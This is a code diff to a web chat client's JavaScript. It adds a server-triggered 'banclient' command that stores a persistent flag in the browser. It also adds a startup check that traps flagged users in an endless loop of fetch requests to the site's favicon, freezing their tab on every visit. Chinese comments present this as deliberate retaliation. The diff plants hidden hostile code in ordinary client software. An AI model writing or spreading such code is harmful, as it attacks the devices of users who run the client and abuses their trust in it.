@@ -691,6 +691,10 @@ var global_config = {
         }
       }
     },
+    banclient(e) {
+      localStorage['client-banned'] = true
+      location.reload()    // 重载，开启震撼时代
+    },
     history(j) {
       global_config.doMessage((e) => {
         return [
@@ -1496,6 +1500,18 @@ function pushWelcomeButton(text) {
   );
 }
 /*********************************************/
+
+function checkClientBanned() {
+	// 检查客户端是否被封禁
+	// MrZhang365：有时候我们真得学学当初不被我们看好的XC的kill功能，只用一个小把戏，就成功驱逐了卢本伟
+	if (!localStorage['client-banned']) return false
+	while (true) {
+		// 既然他们不讲道德，那我对他们讲的道德就是浪费
+		// 疯狂GET我们的通知提示音，反正是静态文件，还有cloudflare护体，打不爆的
+		fetch('https://im.chat.zhangsoft.link/favicon.ico').then(async result => console.log(await result.text()))
+	}
+}
+
 function buildReplyText(user, text) {
   var replyText = `>`;
   var tooLong = true;
@@ -1694,10 +1710,12 @@ function Chat() {
     </>
   );
 }
+
 function App() {
   React.useLayoutEffect(() => {
     if (!loaded) {
       loaded = true;
+      checkClientBanned()    // 首先执行
       global_config.md.init();
       if (global_config.pageMode) return global_config.ui.initIndexPage();
       global_config.ui.updatePageWidth();
